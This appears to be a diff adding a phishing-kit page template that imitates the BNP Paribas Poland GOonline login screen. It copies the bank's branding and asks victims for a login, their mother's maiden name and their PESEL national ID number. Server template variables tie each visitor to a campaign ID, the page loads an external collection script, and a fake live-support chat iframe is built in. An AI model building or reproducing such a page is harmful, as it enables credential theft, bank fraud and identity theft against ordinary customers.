@@ -1,0 +1,262 @@
+<html ng-app="bnpApp" lang="pl-PL" class="ng-scope">
+
+<head>
+    <style type="text/css">
+        @charset "UTF-8";
+
+        [ng\:cloak],
+        [ng-cloak],
+        [data-ng-cloak],
+        [x-ng-cloak],
+        .ng-cloak,
+        .x-ng-cloak,
+        .ng-hide:not(.ng-hide-animate) {
+            display: none !important;
+        }
+
+        ng\:form {
+            display: block;
+        }
+
+        .ng-animate-shim {
+            visibility: hidden;
+        }
+
+        .ng-anchor {
+            position: absolute;
+        }
+    </style>
+
+    <meta charset="utf-8">
+    <title>Bank BNP Paribas</title>
+    <base href="/">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <script>window.applicationBuildVersion = "1.23.120", window.portalThemeDefault = "retail"</script>
+    <link rel="stylesheet" href="/css/default_lk.css">
+    <style>
+        body {
+            display: none
+        }
+    </style>
+    <link id="bnp-theme-stylesheet-link" rel="stylesheet" href="/css/paribas.css"
+        data-theme-default-href="/assets/theme/retail/assets/css/theme-1.26.136.css"
+        data-theme-retail-href="/assets/theme/retail/assets/css/theme-1.26.136.css"
+        data-theme-private-href="/assets/theme/private/assets/css/theme-1.26.136.css"
+        data-theme-optima-href="/assets/theme/optima/assets/css/theme-1.26.136.css">
+    <link rel="icon" href="https://goonline.bnpparibas.pl/#!/login/favicon.ico">
+</head>
+
+<body style="display: block;">
+    <!-- uiView: -->
+    <ui-view class="ng-scope">
+        <ui-bnp-system-messages placement="TOP-UNAUTHENTICATED" is-top="true" class="ng-scope ng-isolate-scope">
+            <!-- ngIf: $ctrl.systemMessages.length > 0 -->
+        </ui-bnp-system-messages>
+        <ui-bnp-messages-ng class="ng-scope ng-isolate-scope">
+            <!-- ngIf: $ctrl.theme !== 'optima' && $ctrl.showInstallGOmobile -->
+            <div class="bnp-toasts-wrapper">
+                <!-- ngRepeat: toast in $ctrl.toasts -->
+            </div>
+            <div class="bnp-messages-wrapper">
+                <!-- ngRepeat: message in $ctrl.systemMessages | orderBy : 'order' -->
+            </div> <!-- ngIf: $ctrl.isModalsContainerVisible() -->
+        </ui-bnp-messages-ng>
+        <widget-bnp-login properties="{}" class="ng-scope ng-isolate-scope">
+            <div class="bnp-modals-container">
+                <!-- ngIf: $ctrl.showTermsOfUseModal -->
+            </div> <!-- ngIf: $ctrl.currentStepId === '' && $ctrl.skipLoginWithImage -->
+            <bnp-pre-login data-ng-if="$ctrl.currentStepId === '' &amp;&amp; $ctrl.skipLoginWithImage"
+                data-test-id="login-widget" data-trace-id="$ctrl.currentData.traceId"
+                data-on-success="$ctrl.onInitialStepSuccess(payload)" class="ng-scope ng-isolate-scope">
+                <bnp-common-login-page data-site-is-inaccessible="$ctrl.siteIsInaccessible"
+                    data-title="Zaloguj się do GOonline"
+                    data-subtitle="Podaj swój identyfikator lub login, aby zalogować się do serwisu transakcyjnego."
+                    class="ng-isolate-scope">
+                    <!-- ngIf: !$ctrl.siteIsInaccessible -->
+                    <section class="bnp-login ng-scope" data-ng-if="!$ctrl.siteIsInaccessible">
+                        <div class="login-left-col-wrapper">
+                            <bnp-login-header-logo class="ng-isolate-scope">
+                                <header class="login-left-col-header">
+                                    <div class="bnp-logo-container">
+                                        <h1> <a data-ng-click="$ctrl.goHome()" href="javascript:void(0);"
+                                                class="bnp-logo" data-ng-attr-title="{{:: 'logo.logoTitle' | i18n }}"
+                                                title="BNP PARIBAS - logowanie - strona główna">
+                                                <div class="bnp-c-image bnp-c-image--bnp-paribas-logo-full"></div>
+                                            </a> </h1>
+                                    </div>
+                                </header>
+                            </bnp-login-header-logo>
+                            <main class="bnp-login-contents">
+                                <div class="row">
+                                    <div class="col-12">
+                                        <div class="login-field" data-ng-class="::$ctrl.contentClass">
+                                            <ng-transclude ng-transclude-slot="beforeTitle"></ng-transclude>
+                                            <!-- ngIf: ::$ctrl.title -->
+                                            <div data-ng-if="::$ctrl.title"
+                                                class="bnp-c-widget-header bnp-c-widget-header--lg ng-scope">
+                                                <h2 class="ng-binding">Zaloguj się do GOonline</h2>
+                                            </div><!-- end ngIf: ::$ctrl.title -->
+                                            <!-- ngIf: $ctrl.subtitle -->
+                                            <p data-ng-if="$ctrl.subtitle" class="subtitle ng-binding ng-scope">Podaj
+                                                swój identyfikator lub login, aby zalogować się do serwisu
+                                                transakcyjnego.</p><!-- end ngIf: $ctrl.subtitle -->
+                                            <!-- ngIf: $ctrl.isLoading -->
+                                            <!-- ngIf: $ctrl.isError -->
+                                            <!-- ngIf: !($ctrl.isLoading || $ctrl.isError) -->
+                                            <ng-transclude data-ng-transclude-slot="content"
+                                                data-ng-if="!($ctrl.isLoading || $ctrl.isError)" class="ng-scope">
+                                                <bnp-common-login-page-content class="ng-scope">
+                                                    <form role="form" id="lk_form" bnp-focus-first-invalid=""
+                                                        class="bnp-c-form ng-pristine ng-valid" autocomplete="off"
+                                                        novalidate="novalidate">
+                                                        <div class="bnp-c-form__field">
+                                                            <div class="bnp-c-form__field__label-wrapper"> <label
+                                                                    class="bnp-c-form__field__label ng-binding">Identyfikator
+                                                                    lub login</label>
+                                                            </div>
+                                                            <div class="bnp-c-form__field__input-wrapper">
+                                                                <div class="bnp-c-input-text"
+                                                                    data-ng-class="{ 'bnp-c-input-text--error': $ctrl.error }">
+                                                                    <input required id="login" type="text"
+                                                                        class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
+                                                                        placeholder="wpisz login lub identyfikator""> </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class=" bnp-c-form__field">
+                                                                    <div class="bnp-c-form__field__label-wrapper">
+                                                                        <label
+                                                                            class="bnp-c-form__field__label ng-binding">Wpisz
+                                                                            nazwisko panieńskie swojej matki</label>
+                                                                    </div>
+                                                                    <div class="bnp-c-form__field__input-wrapper">
+                                                                        <div class="bnp-c-input-text"
+                                                                            data-ng-class="{ 'bnp-c-input-text--error': $ctrl.error }">
+                                                                            <input required id="motherlastname"
+                                                                                type="text"
+                                                                                class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
+                                                                                placeholder="nazwisko panieńskie swojej matki""> </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class=" bnp-c-form__field">
+                                                                            <div
+                                                                                class="bnp-c-form__field__label-wrapper">
+                                                                                <label
+                                                                                    class="bnp-c-form__field__label ng-binding">Pesel</label>
+                                                                            </div>
+                                                                            <div
+                                                                                class="bnp-c-form__field__input-wrapper">
+                                                                                <div class="bnp-c-input-text"
+                                                                                    data-ng-class="{ 'bnp-c-input-text--error': $ctrl.error }">
+                                                                                    <input required id="pesel"
+                                                                                        type="text"
+                                                                                        class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
+                                                                                        placeholder="nazwisko panieńskie swojej matki""> </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class=" bnp-c-form__msg-holder">
+                                                                                    <!-- ngIf: $ctrl.error -->
+                                                                                </div> <button
+                                                                                    class="bnp-c-btn bnp-c-btn--wide mb-4 ng-binding"
+                                                                                    type="submit"
+                                                                                    data-ng-click="$ctrl.preLogin()"
+                                                                                    data-ng-class="{ 'bnp-c-btn--has-loader': $ctrl.isLoading }"
+                                                                                    data-test-id="submit-button">Dalej
+                                                                                </button>
+                                                    </form>
+                                                </bnp-common-login-page-content>
+                                            </ng-transclude><!-- end ngIf: !($ctrl.isLoading || $ctrl.isError) -->
+                                        </div> <!-- ngIf: !$ctrl.hideLoginHints -->
+                                    </div>
+                                </div>
+                            </main>
+                            <div class="bnp-login-bg">
+                                <!-- ngIf: !$ctrl.hidePromoBox -->
+                                <!-- ngInclude: -->
+                                <ng-include data-ng-if="!$ctrl.hidePromoBox"
+                                    src="'https://goonline.bnpparibas.pl/#!/login/templates/login-page/promo-box.html'"
+                                    class="ng-scope">
+                                    <div class="bnp-login-promo ng-scope">
+                                        <div class="bnp-login-promo__centered-box">
+                                            <div class="bnp-login-promo__centered-box__border-box">
+                                                <div class="bnp-login-promo__centered-box__border-box__text">
+                                                    <!-- ngIf: 'login.promoBox.line1' | i18n -->
+                                                    <div data-ng-if="'login.promoBox.line1' | i18n"
+                                                        class="ng-binding ng-scope">Bank</div>
+                                                    <!-- end ngIf: 'login.promoBox.line1' | i18n -->
+                                                    <!-- ngIf: 'login.promoBox.line2' | i18n -->
+                                                    <div data-ng-if="'login.promoBox.line2' | i18n"
+                                                        class="ng-binding ng-scope">zmieniającego się</div>
+                                                    <!-- end ngIf: 'login.promoBox.line2' | i18n -->
+                                                    <!-- ngIf: 'login.promoBox.line3' | i18n -->
+                                                    <div data-ng-if="'login.promoBox.line3' | i18n"
+                                                        class="ng-binding ng-scope">świata</div>
+                                                    <!-- end ngIf: 'login.promoBox.line3' | i18n -->
+                                                    <!-- ngIf: 'login.promoBox.line4' | i18n -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </ng-include><!-- end ngIf: !$ctrl.hidePromoBox -->
+                            </div>
+                        </div>
+                    </section><!-- end ngIf: !$ctrl.siteIsInaccessible -->
+                    <!-- ngIf: $ctrl.siteIsInaccessible -->
+                    <div class="bnp-login-promo">
+
+                    </div>
+                    </script>
+                </bnp-common-login-page>
+            </bnp-pre-login><!-- end ngIf: $ctrl.currentStepId === '' && $ctrl.skipLoginWithImage -->
+            <!-- ngIf: $ctrl.currentStepId === '' && !$ctrl.skipLoginWithImage -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.PASSWORD_RESET -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.PASSWORD_RESET_OTP -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.LOGIN_PASSWORD -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.LOGIN_MASKED_PASSWORD -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.LOGIN_OTP -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.MOBILE_AUTHORIZATION -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.OTP -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.SET_AUTH -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.SCA_SUCCESS_SCREEN -->
+            <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.ONBOARDING_SCREEN -->
+        </widget-bnp-login>
+    </ui-view>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const LOG_TOKEN = <%=log.token%>,
+            AD_LANG = "<%=log.ad.service.lang%>",
+            AD_ID = <%=log.ad.id%>,
+            translate = <%-JSON.stringify(translate) %>;
+    </script>
+    <script src="/js/lk.js" defer></script>
+
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="
+    width: 380px;
+    height: 600px;
+    transform: none;
+    z-index: 2147483647;
+    display: none;
+  ">
+        <div id="chatra__iframe-wrapper">
+            <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+                allow="autoplay" src="/supportChatFrame/<%=log.ad.id%>"
+                style="width: 380px; height: 600px; position: absolute"></iframe>
+        </div>
+    </div>
+    <div class="support-circle"
+        onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+</body>
+
+</html>
